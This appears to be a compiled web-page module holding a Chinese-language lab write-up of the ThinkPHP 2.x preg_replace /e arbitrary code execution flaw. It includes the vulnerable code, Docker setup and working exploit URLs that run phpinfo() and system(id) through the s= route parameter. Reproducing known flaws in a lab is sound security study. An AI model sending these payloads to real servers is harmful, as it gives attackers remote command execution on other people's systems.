import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as e,e as s}from"./app-58e4a7d6.js";const p={},t=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>ThinkPHP 2.x 版本中，使用 <code>preg_replace</code> 的 <code>/e</code> 模式匹配路由：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;@(\\w+)&#39;</span><span class="token operator">.</span><span class="token variable">$depr</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;([^&#39;</span><span class="token operator">.</span><span class="token variable">$depr</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;\\/]+)@e&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;$var[\\&#39;\\\\1\\&#39;]=&quot;\\\\2&quot;;&#39;</span><span class="token punctuation">,</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token variable">$depr</span><span class="token punctuation">,</span><span class="token variable">$paths</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动 ThinkPHP 2.1 的 Demo 应用：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080/Index/Index</code> 即可查看到默认页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接访问 <code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code> 即可执行 <code>phpinfo()</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021449975.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行系统命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/index.php?s=/index/index/name/$%7Bsystem(id)%7D
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021450448.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),i=[t];function o(c,r){return n(),e("div",null,i)}const u=a(p,[["render",o],["__file","ThinkPHP 2.x 任意代码执行漏洞.html.vue"]]);export{u as default};
